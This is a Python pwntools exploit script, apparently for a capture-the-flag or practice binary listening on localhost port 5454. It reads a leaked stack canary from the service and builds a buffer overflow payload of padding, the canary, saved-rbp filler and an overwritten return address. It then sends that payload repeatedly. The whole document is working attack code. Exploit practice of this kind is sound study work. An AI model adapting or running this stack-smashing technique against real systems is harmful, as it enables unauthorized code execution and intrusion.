from pwn import *

# Set log level to debug
context.log_level = 'debug'

# Connect to the local or remote process
p = remote("localhost", 5454)  # Use process('./repeat') for local testing

# Receive and extract the canary address
p.recvuntil(b'ground: ', timeout=20)
hex_address = p.recvline().strip()
print(f"The extracted hexadecimal address is: {hex_address.decode()}")

# Convert and pack the canary
address_int = int(hex_address, 16)
packed_canary = p64(address_int)
print(f"Packed canary (byte representation): {packed_canary.hex()}")

# Wait for the prompt
p.recvuntil(b'>')

# Construct the payload
padding = b'A' * 72 # Adjust to match your stack layout
rbp_padding = b'B' * 8
return_address = p64(0x401366)
#return_address = p64(0x4013e5)
payload = padding + packed_canary + rbp_padding + return_address

# Print the full payload for verification
print("Payload to be sent (hex):", payload.hex())

#p.sendline(payload)
# Send the payload in a loop (adjust the number of iterations as needed)
for i in range(9):  # You can change the number of iterations
    print(f"Sending payload iteration {i + 1}")
    p.sendline(payload)
    p.recvuntil(b'>', timeout=10) 
# Send a final newline to end the input
p.sendline(b'')

# Receive and print the final response
final_response = p.recvall(timeout=10)
print("Final response after sending the payload:")
print(final_response.decode())

# Close the connection
p.close()
